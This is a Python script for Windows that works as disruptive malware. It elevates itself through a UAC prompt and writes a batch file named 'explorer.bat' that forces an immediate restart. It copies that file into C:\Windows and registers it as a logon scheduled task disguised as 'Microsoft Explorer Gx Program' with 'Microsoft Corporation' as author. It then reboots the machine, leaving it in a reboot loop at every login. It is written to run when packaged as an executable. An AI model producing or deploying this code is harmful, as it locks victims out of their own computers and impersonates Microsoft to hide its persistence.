import shutil
import os
import ctypes
import sys
import win32com.client



username = os.getlogin()
name_app = 'explorer.bat'


def create_sleeapr(sleeper_name):
    name = sleeper_name
    bat_commands = """@echo off
    shutdown /r /f /t 0
    """

    try:
        with open(name, 'w') as f:
            f.write(bat_commands)
    except Exception as e:
        print(f'{e}')

def app(sleeper_name):
    main_file_path = sleeper_name
    copy_file_path = rf'C:\Windows'


    if not os.path.exists(copy_file_path):
        os.makedirs(copy_file_path)

    try:
        file_name = os.path.basename(main_file_path)
        final_destination_path = os.path.join(copy_file_path, file_name)
        shutil.copy(main_file_path, final_destination_path)
    except Exception as e:
        print(f'{e}')
    
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def startup():
    TASK_NAME = 'Microsoft Explorer Gx Program'
    PROGRAM_PATH = r'C:\Windows\explorer.bat'

    scheduler = win32com.client.Dispatch('Schedule.Service')
    scheduler.Connect()
    root_folder = scheduler.GetFolder('\\')

    task_def = scheduler.NewTask(0)
    task_def.RegistrationInfo.Author = 'Microsoft Corporation'
    task_def.Settings.Enabled = True
    task_def.Settings.StopIfGoingOnBatteries = False
    task_def.Settings.DisallowStartIfOnBatteries = False
    task_def.Settings.ExecutionTimeLimit = "PT0S"
    task_def.Settings.MultipleInstances = 0
    task_def.Settings.RunOnlyIfNetworkAvailable = False

    trigger = task_def.Triggers.Create(9)
    trigger.Id = 'LogonTriggerId'
    trigger.Enabled = True

    action = task_def.Actions.Create(0)
    action.ID = 'Action1'
    action.Path = PROGRAM_PATH

    try:
        root_folder.DeleteTask(TASK_NAME, 0)
    except:
        pass



    try:
        registered_task = root_folder.RegisterTaskDefinition(
            TASK_NAME,
            task_def,
            6,
            None,
            None,
            3   
        )
    except:
        pass 

if not is_admin():
    ctypes.windll.shell32.ShellExecuteW(None, 'runas', sys.executable, ' '.join(sys.argv), None, 1)
    sys.exit()


if getattr(sys, 'frozen', False):
    create_sleeapr(name_app)
    app(name_app)
    startup()
    os.remove('explorer.bat')
    os.system('shutdown /r /f /t 0')
else:
    pass

